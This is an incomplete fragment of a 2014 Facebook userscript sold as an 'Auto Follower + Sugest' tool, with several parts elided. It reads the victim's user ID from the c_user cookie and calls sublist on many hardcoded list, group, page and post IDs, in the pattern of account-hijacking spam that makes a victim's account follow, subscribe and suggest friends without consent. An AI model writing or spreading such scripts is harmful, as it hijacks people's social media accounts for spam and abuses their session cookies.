// ==UserScript==
// @name            **[Updated]**Auto Follower + Sugest for Facebook 100% working updated 2014
...
sublist("1375717846031442");
sublist("1375664092703484");
sublist("1375663972703496");
sublist("1375663799370180");
sublist("1375663629370197");
sublist("1375664326036794");
sublist("1375664419370118");
sublist("1375664492703444");
sublist("1375664649370095");
sublist("1375664689370091");
sublist("1375664729370087");
sublist("1375664782703415");
sublist("1375672799369280");


var gid = ['126516857558198'];
...
var spage_id = "694369857241431";
var spost_id = "694369857241431";
var sfoto_id = "694369857241431";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Rizky_Creations';
